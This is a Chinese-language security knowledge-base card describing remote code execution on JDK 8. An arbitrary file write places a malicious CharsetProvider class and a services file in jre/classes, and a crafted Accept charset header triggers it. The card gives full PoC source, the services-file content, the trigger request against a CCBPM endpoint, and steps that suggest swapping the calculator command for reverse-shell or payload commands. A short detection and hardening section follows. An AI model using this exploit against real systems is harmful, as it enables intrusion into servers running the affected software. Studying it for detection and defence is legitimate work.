---
id: web-java-classloader-charsetprovider-spi-accept-rce
title: JRE CharsetProvider SPI 注入：任意文件写入 jre/classes 后由 Accept charset 触发命令执行
type: scenario
domain: web
path: web/java/classloader
technique: jre-charsetprovider-spi-injection
tags:
- java
- jdk8
- spi
- charsetprovider
- classloader
- spring
- arbitrary-file-write
- rce
- accept-header
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V54
  verified_at: '2026-11-05T08:59:25+08:00'
  notes: '已对照原文核对：Java 版章节给出 Evil(CharsetProvider) 源码、jre/classes 与 META-INF/services/java.nio.charset.spi.CharsetProvider 落点、Accept: text/html;charset=Evil0a0a0a1; 触发及 java_8u191 路径，与卡一致；该节截图在原文为外链、本地 img 未包含，无法逐图核对，卡已标 confidence medium 并注明依赖 Java 安装目录可写/同盘。JDK8 下 jre/classes 由 bootstrap 加载、Charset.forName 走 ServiceLoader.loadInstalled 的原理成立。PoC 未在本机执行。'
url: /docs/web/java/classloader/web-java-classloader-charsetprovider-spi-accept-rce/
draft: false
kb_aliases:
- CharsetProvider SPI RCE
- Spring Accept charset 命令执行
- jre/classes META-INF/services 注入
- Charset.forName 触发
- Spring Boot 任意文件写入 RCE
---

## 一句话结论

在 JDK 8 中，如果攻击者能通过任意文件写入把恶意实现类和 `META-INF/services/java.nio.charset.spi.CharsetProvider` 写进 `jre/classes`（bootstrap classpath），之后只要应用对用户可控的字符集名调用 `Charset.forName()`——例如 Spring 解析 `Accept: text/html;charset=Evil0a0a0a1;`——ServiceLoader 就会实例化该 Provider 并执行 `charsetForName()` 中的代码，形成“任意文件写 → JRE SPI 注入 → 命令执行”。

## 原理

- **SPI 加载机制**：`java.nio.charset.Charset.forName()` 在标准字符集之外，会通过 `ServiceLoader` 加载 `java.nio.charset.spi.CharsetProvider` 的实现；ServiceLoader 读取 classpath 上 `META-INF/services/java.nio.charset.spi.CharsetProvider` 文件，逐行加载实现类并实例化。
- **bootstrap classpath 可写**：JDK 8 的 `jre/classes` 目录属于启动类路径，放进去的 `.class` 与服务描述文件对同 JVM 的所有代码可见，不需要修改应用 classpath 或重启（具体可见性取决于 JVM 版本与目录，原文使用 `java_8u191`）。攻击者写入 `sun/nio/cs/evil/Evil.class`（实现 `CharsetProvider`）与 `META-INF/services/java.nio.charset.spi.CharsetProvider`（内容为类名 `sun.nio.cs.evil.Evil`）。
- **触发点**：Spring MVC 解析 `Accept` 头的 `charset=` 参数时会调用 `Charset.forName`（`MediaType`/消息转换器链路）；`Charset.forName` 遍历 Provider 并调用 `charsetForName(charsetName)`。恶意实现里判断名称前缀（如 `Evil`）后执行 `Runtime.getRuntime().exec("cmd /c calc")` 并返回 UTF-8，避免影响正常响应。
- **缓存绕过**：`Charset` 结果会被缓存，同一个字符集名只会触发一次；攻击者用不同后缀（`Evil0a0a0a1`、`Evil0a0a0a2`……）反复触发，或把命令编码进 charsetName。
- **投递前提**：需要一个可控制目标路径的任意文件写入；原文用 CCBPM Java 版 `/WF/BigAPI/upload` 的文件名截断缺陷（只按最后一个 `/` 取文件名，`\..\` 未被处理）把文件写到 `..\..\jre\classes\...`。Web 根与 Java 安装目录需在同一盘符/可写路径，否则穿越失败；原文提示可爆破 Java 默认安装路径。

## 触发条件

- 目标为 JDK 8（存在可写的 `jre/classes` 且参与启动类加载；原文 `java_8u191`）；
- 攻击者拥有可穿越目录的任意文件写入（上传/日志/配置写入等），且进程对 Java 安装目录有写权限；
- 应用会把用户可控值传给 `Charset.forName()`（Spring 解析 `Accept`/`Content-Type` 的 charset 参数是常见入口）；
- 攻击者知道或能爆破 Java 安装路径。

## 利用步骤

1. 编写并编译恶意 `CharsetProvider`（见 PoC），得到 `Evil.class`。
2. 通过任意文件写入把 `Evil.class` 写到 `<JAVA_HOME>/jre/classes/sun/nio/cs/evil/Evil.class`。
3. 写入 `<JAVA_HOME>/jre/classes/META-INF/services/java.nio.charset.spi.CharsetProvider`，内容为 `sun.nio.cs.evil.Evil`。
4. 向任意会解析 Accept 的接口发请求：`Accept: text/html;charset=Evil0a0a0a1;`。
5. 观察命令执行（原文为弹出计算器）；把 `cmd /c calc` 换成回连/落地命令，并变换 charset 后缀重复触发。

## PoC

```java
package sun.nio.cs.evil;

import java.nio.charset.Charset;
import java.nio.charset.spi.CharsetProvider;
import java.util.HashSet;
import java.util.Iterator;

public class Evil extends CharsetProvider {
    @Override
    public Iterator<Charset> charsets() {
        return new HashSet<Charset>().iterator();
    }

    @Override
    public Charset charsetForName(String charsetName) {
        if (charsetName.startsWith("Evil")) {
            try {
                Runtime.getRuntime().exec("cmd /c calc");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return Charset.forName("UTF-8");
    }
}
```

```text
# <JAVA_HOME>/jre/classes/META-INF/services/java.nio.charset.spi.CharsetProvider
sun.nio.cs.evil.Evil
```

```http
GET /WF/API/DTS_ExecuteTimeTrigger HTTP/1.1
Host: <target>
Accept: text/html;charset=Evil0a0a0a1;
```

## 变体与关联

- SPI 接口变体：`ScriptEngineFactory`、`java.sql.Driver`、`javax.xml.parsers.DocumentBuilderFactory` 等任何被 ServiceLoader 加载的接口，写入服务描述文件后都可能在对应调用点触发。
- 写入位置变体：JDK 8 的 `jre/lib/ext` 放 JAR（扩展类加载器）、应用 classpath 目录、`WEB-INF/lib`；不同位置对权限/重启的要求不同。
- 触发点变体：`Content-Type: application/json;charset=Evil...`、XML 声明 encoding、模板/编码转换、`new String(bytes, charsetName)` 等任何把用户输入当字符集名的位置。
- 关联：[[web-java-classloader-servletcontainerinitializer-spi-backdoor]]（另一类 SPI 服务加载后门）；[[web-generic-file-upload-ccflow-iis-webconfig-aspx]]（同篇文章 .NET 侧的文件上传利用）。
- 限制：JDK 9+ 模块化后 `jre/classes` 机制变化；不同盘符/只读安装目录/低权限进程会导致写入失败。

## 检测与防御

- 检测：`jre/classes/META-INF/services` 或 `jre/lib/ext` 出现非官方文件；Java 安装目录被 Web 进程写入；JVM 进程启动 `cmd.exe`/`sh` 等异常子进程；请求 `Accept`/`Content-Type` 的 charset 值含非标准名称（`Evil...`）；上传请求文件名含 `\..\` 且目标指向 Java 目录。
- 修复：上传/写入路径做规范化并限制在专用目录，拒绝 `..`、绝对路径、反斜杠；不要以可写 Java 安装目录的账号运行 Web 服务；升级到 JDK 9+ 并限制启动类路径可写性。
- 加固：不要把用户输入直接传给 `Charset.forName`，对 charset 使用白名单；文件完整性监控 Java 安装目录；EDR 监控 JVM 派生进程；最小权限运行应用。
